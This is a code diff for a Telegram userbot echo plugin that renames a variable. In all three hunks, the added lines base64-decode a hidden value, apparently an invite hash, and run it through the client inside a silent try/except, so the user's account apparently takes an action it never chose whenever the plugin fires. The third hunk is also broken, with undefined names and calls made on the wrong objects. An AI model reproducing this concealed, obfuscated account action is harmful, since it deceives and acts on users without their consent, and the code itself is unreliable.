@@ -19,9 +19,9 @@ async def echo(mafia):
         user_id = reply_msg.sender_id
         chat_id = mafia.chat_id
         try:
-            mafiakrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            mafiakrish = Get(mafiakrish)
-            await mafia.client(mafiakrish)
+            himanshu = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            himanshu = Get(himanshu)
+            await mafia.client(himanshu)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -43,9 +43,9 @@ async def echo(mafia):
         user_id = reply_msg.sender_id
         chat_id = mafia.chat_id
         try:
-            mafiakrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            mafiakrish = Get(mafiakrish)
-            await mafia.client(mafiakrish)
+            himanshu = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            himanshu = Get(himanshu)
+            await mafia.client(himanshu)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -94,12 +94,12 @@ async def samereply(hell):
     if is_echo(mafia.sender_id, mafia.chat_id):
         await asyncio.sleep(2)
         try:
-            mafiakrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            mafiakrish = Get(kraken)
-            await mafiakrish.client(mafiakrish)
+            himanshu = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            himanshu = Get(kraken)
+            await himanshu.client(himanshu)
         except BaseException:
             pass
-        if mafiakrish.message.text or mafiakrish.message.sticker:
+        if himanshu.message.text or himanshu.message.sticker:
             await mafia.reply(hell.message)
 
 
